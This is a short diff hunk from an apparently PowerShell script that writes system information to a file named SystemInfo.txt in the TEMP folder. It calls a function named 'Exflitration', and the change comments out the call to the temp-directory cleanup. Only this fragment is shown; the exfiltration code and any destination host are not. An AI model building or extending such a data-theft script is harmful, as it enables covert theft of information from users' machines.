@@ -285,4 +285,4 @@ $outputPath = Join-Path $env:TEMP "SystemInfo.txt"
 Exflitration
 
 #Call DelTempDir
-DelTempDir
+#DelTempDir
